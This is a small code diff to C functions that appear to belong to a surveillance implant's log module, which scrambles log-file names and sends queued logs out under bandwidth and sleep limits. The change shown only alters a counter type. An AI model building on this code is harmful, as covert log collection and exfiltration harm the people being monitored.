@@ -1238,7 +1238,7 @@ BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 	char DirSpec[DLLNAMELEN];  
 	char *scrambled_search;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
-	UINT64 log_count = 0;
+	DWORD log_count = 0;
 	UINT64 log_size = 0;
 
 	scrambled_search = LOG_ScrambleName("OUTF*.log", crypt_key[0], TRUE);
@@ -1292,7 +1292,7 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 	log_list_struct *log_list;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
 	DWORD tmp_free_space;
-	UINT64 log_count = 0;
+	DWORD log_count = 0;
 	UINT64 log_size = 0;
 
 	// Cerca tutti i file di tipo "1/0LOG*.log", sia LOG_, sia LOGF_
